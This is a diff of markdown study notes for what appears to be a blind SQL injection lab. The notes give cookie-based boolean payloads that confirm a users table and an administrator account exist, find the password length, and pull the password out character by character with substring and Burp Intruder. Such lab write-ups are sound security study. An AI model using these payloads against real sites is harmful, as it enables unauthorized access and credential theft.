@@ -14,7 +14,7 @@
    1. select tracking_id from tracking-table where tracking-id = the value stored.
 3. so the goal now is to modify this tracking-id, and check if we see anything different in the website
 4. Second step is to provide true statement, that you already know that it works well
-   1. use the same cookie provided to you in the cookies alond with 1=1.
+   1. use the same cookie provided to you in the cookies along with 1=1.
       1.   select tracking_id from tracking-table where tracking-id = '1234'' and 1=1 --
    2. and check if you see Welcome back message
 5. then provide false statement, and check if the welcome back message disappear. 
@@ -23,12 +23,16 @@
 6. Confirm that we have users table, if true, we will see welcome back message
    1. select tracking_id from tracking-table where tracking-id = '1234'' and (select 'x' from users LIMIT 1)='x' --
       1. what we are doing here now is that we are searching for user x, and limit it to one entry only to avoid crash, and check if x = x, if true this will show the welcome back message.
+      2. (select 'x' from users LIMIT 1) this will return to you the object that you selected, then you need to make it in for of boolean that is why we add ='x'
 7. Now, we know that table users exist in the database, now we should ensure that user 'administrator' exist in the users table
    1. select tracking_id from tracking-table where tracking-id = '1234'' and (select username from users where username ='administrator')='administrator' --
+   2. this should return true.
 8. Now we will try to bruteforce his password character by character
    1. First we need to determine the length of the password using the LENGH > X and we keep iterating until we get error, then we know the length
-   2. select tracking_id from tracking-table where tracking-id = '1234'' and (select username from users where username ='administrator' and LENGTH(password) > **1**)='administrator' --
-   3. but instead of doing this manually, we can use the intruder, to brute force this.
+      1. select tracking_id from tracking-table where tracking-id = '1234'' and (select username from users where username ='administrator' and LENGTH(password) > **1**)='administrator' --
+      2. select tracking_id from tracking-table where tracking-id = '1234'' and (select username from users where username ='administrator' and LENGTH(password) > **2**)='administrator' --
+      3. select tracking_id from tracking-table where tracking-id = '1234'' and (select username from users where username ='administrator' and LENGTH(password) > **3**)='administrator' --
+   2. but instead of doing this manually, we can use the intruder, to brute force this.
       1. go to the intruder
       2. select the location you want and mark it with sniper
          1. ![Sniper_Intruder](Sniper_Intruder.png)
@@ -38,8 +42,9 @@
          1. ![length_brute_force_Intruder](length_brute_force_Intruder.png)
          2. by checking the length of the response, you will see that all responses having the same length, until we reach the 20 response. 
          3. this indicates that the password length is 20. 
-   4. Then after that we will brute-force the password. 
+   3. Then after that we will brute-force the password. 
       1. select tracking_id from tracking-table where tracking-id = '1234'' and (select substring(password,1,1) from users where username ='administrator')='a' --
+         1. substring(column, start_idx, number_of_chars)
       2. and we should iterate all alphanumeric characters, and we may also include special characters. 
       3. so we can do this again using the intruder:
          1. ![Highlighting_a_for_password_brute_force](Highlighting_a_for_password_brute_force.png)
